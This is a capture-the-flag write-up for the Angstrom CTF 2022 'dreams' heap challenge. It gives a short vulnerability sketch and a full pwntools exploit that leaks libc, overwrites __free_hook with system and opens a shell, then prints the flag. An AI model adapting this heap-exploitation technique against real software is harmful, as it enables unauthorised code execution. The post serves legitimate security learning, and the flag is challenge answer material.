---
title: "[Pwn] dreams [Angstrom CTF 2022]"
date: 2022-05-07 00:41:00
---

# 0x0 Introduction

Sometimes I want to just stay in my dreams.

I heard this helps: libc.so.6.

nc challs.actf.co 31227

Author: JoshDaBosh

files: [dreams](dreams), [libc.so.6](libc.so.6)

# 0x1 Mitigation

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```


# 0x2 Vulnerability

todo

heap problem.

using pointer stored in the freed heap, point next heap to of the `obj.dreams`.

Then, change one address in `obj.dreams` to `__free_hook`. overwrite `__free_hook` to `system`.

`free("/bin/sh")` to get shell.

# 0x3 Exploit

```python
from pwn import *

exe = ELF("dreams_patched")
libc = ELF("libc.so.6")
# ld = ELF("./ld-2.27.so")

context.binary = exe
# context.log_level = 'DEBUG'

def log_print(*msg):
    log.info(" ".join(map(str,msg)))

def start():
    if args.LOCAL:
        r = process([exe.path])
        if args.R2:
            input("Wait r2 attach")
    else:
        r = remote("challs.actf.co", 31227)
    return r


io = start()

def sleep(io,slot,date,dream):
    time.sleep(0.1)
    io.sendlineafter(b">",b'1')
    time.sleep(0.1)
    io.sendlineafter(b"this dream? ",str(slot).encode())
    time.sleep(0.1)
    io.sendafter(b"(mm/dd/yy))?",flat({0:[date]},length=0x8,filler=b'\x00'))
    time.sleep(0.1)
    io.sendafter(b"dream about? ",flat({0:[dream]},length=0x14,filler=b'\x00'))

def sell(io,slot):
    time.sleep(0.1)
    io.sendlineafter(b">",b'2')
    time.sleep(0.1)
    io.sendlineafter(b"trading in?",str(slot).encode())
    io.recvuntil(b"Get out of here.\n")

def visit(io,slot,date):
    time.sleep(0.1)
    io.sendlineafter(b">",b'3')
    time.sleep(0.1)
    io.sendlineafter(b"trouble?",str(slot).encode())
    io.recvuntil(b'that ')
    bs = io.recvuntil(b'\nDue',drop=True)
    time.sleep(0.1)
    io.sendafter(b"New date: ",flat({0:[date]},length=0x8,filler=b'\x00'))
    return bs

sleep(io,0,"AAAA","BBBB")
sleep(io,1,"AAAA","BBBB")
sell(io,0)
sell(io,1)
top_pointer = int.from_bytes(visit(io,1,exe.symbols["dreams"]),"little")
log_print("top_pointer",hex(top_pointer))
sleep(io,2,exe.got["printf"]-8,exe.symbols["MAX_DREAMS"])
sleep(io,3,top_pointer + 0x1300,b'A'*0x14)
libc.address = int.from_bytes(visit(io,0,0),"little") - libc.sym["printf"]
visit(io,1,0x1337)
print("libc_base_addr",hex(libc.address))
sleep(io,20,"AAAA", 0)
sleep(io,22,"AAAA",0)
sell(io,20)
sell(io,22)
visit(io,22,exe.symbols["dreams"])
sleep(io,10, libc.sym['__free_hook'],0)
sleep(io,14, top_pointer + 0x1360,0)
visit(io,0,libc.sym['system'])
sleep(io,1,"/bin/sh",0)
io.sendlineafter(b">",b'2')
io.sendlineafter(b"trading in?",b'1')

io.interactive()


```

# 0x4 Flag

actf{hav3_you_4ny_dreams_y0u'd_like_to_s3ll?_cb72f5211336}